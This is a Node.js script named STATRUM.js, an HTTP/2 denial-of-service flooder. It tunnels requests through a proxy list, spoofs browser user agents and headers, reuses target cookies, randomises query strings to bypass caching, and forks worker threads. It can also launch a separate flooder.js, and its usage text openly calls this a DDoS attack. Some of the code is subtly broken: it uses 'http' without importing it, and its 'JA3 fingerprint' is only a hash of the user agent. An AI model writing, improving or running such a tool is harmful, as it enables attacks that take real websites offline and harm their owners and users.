const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const axios = require('axios');
const https = require('https');
const { exec } = require('child_process');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

// Define script expiration date (YYYY, MM-1, DD)
const expirationDate = new Date(2034, 8, 30); // Example: September 30, 2034

// Check if the current date is past the expiration date
if (new Date() > expirationDate) {
    console.log(`This script has expired. Please obtain an updated version.`);
    process.exit(1);
}

if (process.argv.length < 7) {
    console.log(`Usage:
    node STATRUM.js <target_url> <duration> <rate> <threads> <proxy_file> [options]
    
Options:
    --redirect      Enable redirect system (true/false)
    --query         Enable random queries for path (true/false)
    --ratelimit     Enable ratelimit system (true/false)
    --debug         Show all debug information (true/false)
    --cookie        Use cookies retrieved from the target to maintain sessions (true/false)
    --flood         Run additional flooder script (true/false)

Examples:
    1. Basic attack with redirects, random queries, rate limit, and debugging:
       node STATRUM.js https://example.com 60 100 10 proxies.txt --redirect true --query true --ratelimit true --debug true

    2. Attack with cookies retrieval and usage:
       node STATRUM.js https://example.com 60 100 10 proxies.txt --cookie true --debug true

    3. Attack with all options enabled:
       node STATRUM.js https://example.com 60 100 10 proxies.txt --redirect true --query true --ratelimit true --debug true --cookie true --flood true
    `);
    process.exit();
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

const options = process.argv.slice(7);
const optionFlags = {
    redirectEnabled: false,
    queryEnabled: false,
    ratelimitEnabled: false,
    debugEnabled: false,
    cookieEnabled: false,
    floodEnabled: false
};

// Parse options
options.forEach((arg, index) => {
    switch (arg) {
        case '--redirect':
            optionFlags.redirectEnabled = options[index + 1] === 'true';
            break;
        case '--query':
            optionFlags.queryEnabled = options[index + 1] === 'true';
            break;
        case '--ratelimit':
            optionFlags.ratelimitEnabled = options[index + 1] === 'true';
            break;
        case '--debug':
            optionFlags.debugEnabled = options[index + 1] === 'true';
            break;
        case '--cookie':
            optionFlags.cookieEnabled = options[index + 1] === 'true';
            break;
        case '--flood':
            optionFlags.floodEnabled = options[index + 1] === 'true';
            break;
    }
});

let ratelimit = [];
let cookies = [];

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
};

function getStatus() {
    const agent = new https.Agent({ rejectUnauthorized: false });
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('Request Timed Out'));
        }, 5000);
    });

    const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response;
            const title = getTitleFromHTML(data);
            console.log(`${getCurrentTime()} [STATRUM] Title: ${title} (\x1b[32m${status}\x1b[0m)`);
            
            if (optionFlags.cookieEnabled) {
                const setCookieHeader = response.headers['set-cookie'];
                if (setCookieHeader) {
                    cookies = setCookieHeader;
                    if (optionFlags.debugEnabled) {
                        console.log(`${getCurrentTime()} [STATRUM] Retrieved Cookies: ${cookies}`);
                    }
                }
            }
        })
        .catch((error) => {
            if (error.message === 'Request Timed Out') {
                console.log(`${getCurrentTime()} [STATRUM] Request Timed Out`);
            } else if (error.response) {
                const extractedTitle = getTitleFromHTML(error.response.data);
                console.log(`${getCurrentTime()} [STATRUM] Title: ${extractedTitle} `);
            } else {
                console.log(`${getCurrentTime()} [STATRUM] ${error.message}`);
            }
        });
}

function getTitleFromHTML(html) {
    const titleRegex = /<title>(.*?)<\/title>/i;
    const match = html.match(titleRegex);
    if (match && match[1]) {
        return match[1];
    }
    return 'Not Found';
}

function randomString(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

async function attack() {
    const parsed = url.parse(targetURL);
    const proxies = readLines(proxyFile);

    let proxy;
    do {
        proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');
    } while (ratelimit.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));

    const agent = new http.Agent({
        keepAlive: true,
        maxFreeSockets: Infinity,
        keepAliveMsecs: Infinity,
        maxSockets: Infinity,
        maxTotalSockets: Infinity
    });

    const reqOptions = {
        host: proxy[0],
        agent: agent,
        globalAgent: agent,
        port: proxy[1],
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
        },
        method: 'CONNECT',
        path: parsed.host,
    };

    if (optionFlags.debugEnabled) {
        console.log(`${getCurrentTime()} [STATRUM] Using proxy: ${proxy.join(':')}`);
    }

    http.request(reqOptions).on("connect", async (res, socket) => {
        if (res.statusCode === 200) {
            const userAgent = new UserAgent().toString();
            let headers = {
                ":method": "GET",
                ":path": optionFlags.queryEnabled ? `${parsed.pathname}?${randomString(6)}` : parsed.pathname,
                ":authority": parsed.host,
                ":scheme": "https",
                "User-Agent": userAgent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": `"Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"`,
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": `"Windows"`,
                "Sec-Fetch-Site": "none",
                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                "Upgrade-Insecure-Requests": "1",
            };

            if (optionFlags.cookieEnabled && cookies.length > 0) {
                headers["Cookie"] = cookies.join('; ');
            }

            if (optionFlags.debugEnabled) {
                console.log(`${getCurrentTime()} [STATRUM] Using User-Agent: ${userAgent}`);
            }

            const tls_socket = tls.connect({
                host: parsed.host,
                ciphers: crypto.constants.defaultCoreCipherList.split(":").join(":"),
                servername: parsed.host,
                secure: true,
                requestCert: true,
                rejectUnauthorized: false,
                socket: socket,
            });

            tls_socket.setKeepAlive(true, 600000 * 1000);

            await tls_socket.on('secureConnect', async () => {
                const ja3fingerprint = crypto.createHash('md5').update(`${userAgent}`).digest('hex');
                const options = {
                    headers: headers,
                    method: 'GET',
                    host: parsed.host,
                    path: parsed.pathname,
                    port: parsed.port || 443,
                    agent: tls_socket,
                    rejectUnauthorized: false
                };

                if (optionFlags.debugEnabled) {
                    console.log(`${getCurrentTime()} [STATRUM] Making request with JA3 Fingerprint: ${ja3fingerprint}`);
                }

                const req = http2.request(options);
                req.on('response', (headers, flags) => {
                    const status = headers[':status'];
                    const title = getTitleFromHTML(headers[':path']);
                    console.log(`${getCurrentTime()} [STATRUM] Title: ${title} (\x1b[32m${status}\x1b[0m)`);
                });

                req.on('error', (error) => {
                    console.log(`${getCurrentTime()} [STATRUM] Request error: ${error.message}`);
                });

                req.end();
            });

            tls_socket.on('error', (error) => {
                console.log(`${getCurrentTime()} [STATRUM] TLS socket error: ${error.message}`);
            });
        }
    }).end();
}

function startFlooder() {
    const flooderScript = path.resolve(__dirname, 'flooder.js');
    exec(`node ${flooderScript} ${targetURL} ${duration} ${threads} ${rate} ${proxyFile}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing flooder script: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Flooder script stderr: ${stderr}`);
            return;
        }
        console.log(`Flooder script output:\n${stdout}`);
    });
}

if (optionFlags.floodEnabled) {
    startFlooder();
} else {
    if (cluster.isMaster) {
        console.clear();
        console.log(`Starting DDoS attack...`);

        for (let i = 0; i < threads; i++) {
            cluster.fork();
            if (optionFlags.debugEnabled) {
                console.log(`${getCurrentTime()} [STATRUM] Attack Thread ${i + 1} Started`);
            }
        }

        setInterval(getStatus, 2000);
        setTimeout(() => {
            console.log(`${getCurrentTime()} [STATRUM] The Attack Is Over`);
            process.exit(1);
        }, duration * 1000);
    } else {
        const interval = setInterval(attack, 1000 / rate);
        setTimeout(() => {
            clearInterval(interval);
            process.exit(1);
        }, duration * 1000);
    }
}
